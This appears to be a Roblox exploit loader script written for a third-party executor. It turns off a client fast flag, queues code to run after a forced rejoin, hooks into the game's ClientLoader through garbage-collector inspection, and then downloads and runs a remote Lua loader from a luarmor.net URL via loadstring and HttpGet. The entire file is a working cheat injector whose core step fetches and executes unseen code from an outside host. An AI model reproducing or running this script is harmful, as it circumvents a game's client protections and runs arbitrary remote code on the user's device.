if setfflag then
	setfflag("DebugRunParallelLuaOnMainThread", "False")
end

queue_on_teleport([=[
    local actors = {}

    game.DescendantAdded:Connect(function(instance)
        if instance:IsA("Actor") then
            table.insert(actors, instance)
        end
    end)

    task.wait(6)
    
    for _, actor in actors do
    	if actor.Parent == nil then
        run_on_actor(actor, [[
            local require_module
        
            for _, func in getgc(false) do
                if type(func) == "function" and islclosure(func) and debug.getinfo(func).name == "require" and string.find(debug.getinfo(func).source, "ClientLoader") then
                    require_module = func
                    break
                end
            end
            
            if require_module then
                loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9d0b678c6da300ebe2ee7ad262be4b64.lua"))()
            end
        ]])
        end
    end
]=])

game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
